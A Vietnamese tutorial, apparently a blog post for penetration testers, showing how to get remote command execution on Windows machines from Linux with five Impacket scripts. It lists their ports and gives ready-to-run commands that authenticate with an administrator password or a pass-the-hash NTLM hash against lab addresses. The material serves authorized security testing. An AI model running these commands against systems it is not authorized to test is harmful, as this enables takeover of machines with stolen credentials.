Các Pentester có thể họ rất quen thuộc với hệ điều hành Linux với những command line trên terminal, tuy nhiên nếu gặp phải server chạy Windows thì họ lại khá lúng túng trong việc RCE. Bài viết này mình sẽ chỉ ra vài cách có thể RCE trên Windows từ Linux.
## Sử dụng Impacket 
Impacket là gì?
> Impacket is a collection of Python classes for working with network protocols. Impacket is focused on providing low-level programmatic access to the packets and for some protocols (e.g. SMB1-3 and MSRPC) the protocol implementation itself. Packets can be constructed from scratch, as well as parsed from raw data, and the object oriented API makes it simple to work with deep hierarchies of protocols. The library provides a set of tools as examples of what can be done within the context of this library.

Github: https://github.com/SecureAuthCorp/impacket

Ở đây mình nói đến RCE thôi thì Impacket có các chương trình chính để thực hiện RCE trên Windows từ Linux.

| STT | Chương trình | Kiểu RCE | Port sử dụng|
| -------- | -------- | -------- |-----|
| 1     | psexec.py     | interactive shell     | tcp/445|
|2|dcomexec.py|semi-interactive shell|tcp/135 <br>tcp/445 <br>tcp/49751 (DCOM)|
|3|smbexec.py	|semi-interactive shell| tcp/445|
|4| wmiexec.py| semi-interactive shell| tcp/135<br>tcp/445<br>tcp/50911 (Winmgmt)|
|5|atexec.py| command|tcp/445|

### Cài đặt
Impacket có sẵn tại Kali Linux ở đường dẫn `/usr/share/doc/python3-impacket/examples`

Nếu bạn sử dụng các hệ điều hành Linux khác thì có thể vào github xem hướng dẫn cài đặt.
### Impacket: psexec.py
Nếu bạn có mật khẩu của admin thì sử dụng câu lệnh:
```
python3 psexec.py "./Administrator:pass123"@192.168.40.128
```
Nếu bạn có hash NTLM thì sử dụng câu lệnh:
```
python3 psexec.py -hashes aad3b435b51404eeaad3b435b51404ee:5fbc3d5fec8206a30f4b6c473d68ae76 "./Administrator"@192.168.40.128
```
### Impacket: dcomexec.py
Phương pháp Dcomexec.py sử dụng các điểm cuối DCOM như MMC20. Sử dụng phương pháp này yêu cầu giao tiếp trên nhiều cổng mạng (TCP/135, TCP/445) và nội bộ sử dụng hệ thống con DCOM của hệ điều khiển Windows bằng một cổng tự động phân bổ cao như TCP/49751.
Điều này làm cho phương pháp này được sử dụng không phổ biến lắm.

Sử dụng với username và passwd
```
python3 dcomexec.py "./Administrator:pass123"@192.168.40.128
```
Hoặc sử dụng hash NTLM
```
python3 dcomexec.py -hashes aad3b435b51404eeaad3b435b51404ee:5fbc3d5fec8206a30f4b6c473d68ae76 "./Administrator"@192.168.40.128
```

### Impacket: smbexec.py
Sử dụng smbexec.py tận dụng các chức năng Windows SMB riêng để thực hiện các lệnh bất kỳ trên Server Windows. Lưu ý rằng chỉ sử dụng cách này khi cổng TCP/445 mở. Và đây cũng là cách mình hay sử dụng nhất :v:
```
python3 smbexec.py "./Administrator:pass123"@192.168.40.128
```
Hoặc sử dụng hash NTLM
```
python3 smbexec.py -hashes aad3b435b51404eeaad3b435b51404ee:5fbc3d5fec8206a30f4b6c473d68ae76 "./Administrator"@192.168.40.128
```

### Impacket: wmiexec.py
Trong trường hợp này Impacket sử dụng Windows Management Instrumentation (WMI) giao diện của hệ thống remote Windows từ xa để lên shell trên Windows.  
Tương tự như phương pháp dcomexec, wmiexec cần giao tiếp qua cổng mạng 3/dịch vụ. Cách sử dụng cũng tương tự như dcomexec.py.

```
python3 wmiexec.py "./Administrator:pass123"@192.168.40.128
```
Hoặc sử dụng hash NTLM
```
python3 wmiexec.py -hashes aad3b435b51404eeaad3b435b51404ee:5fbc3d5fec8206a30f4b6c473d68ae76 "./Administrator"@192.168.40.128
```

### Impacket: atexec.py
Phương pháp này sử dụng dịch vụ Task Scheduler service (Atsvc) trên hệ thống Windows từ xa để execute command. Tất cả các giao tiếp mạng diễn ra trên cổng TCP/445.
```
python3 atexec.py "./Administrator:pass123"@192.168.40.128 "whoami"
```
Hoặc sử dụng hash NTLM
```
python3 atexec.py -hashes aad3b435b51404eeaad3b435b51404ee:5fbc3d5fec8206a30f4b6c473d68ae76 "./Administrator"@192.168.204.183 "whoami"
```

Trong bài viết này, mình đã chỉ ra được  5 cách sử dụng Impacket để RCE trên các hệ thống Windows từ xa.

Tuy nhiên, rằng Impacket có rất nhiều các package khác để làm nhiều điều khác nữa, bạn đọc có thể tìm hiểu các chức năng của Impacket, nó không chỉ dừng lại ở RCE. Mình đã sử dụng Impacket khá nhiều đối với các hệ thống web server sử dụng Windows. Chúc các bạn tìm thấy được điều gì đó cần thiết với mình ở bài viết này.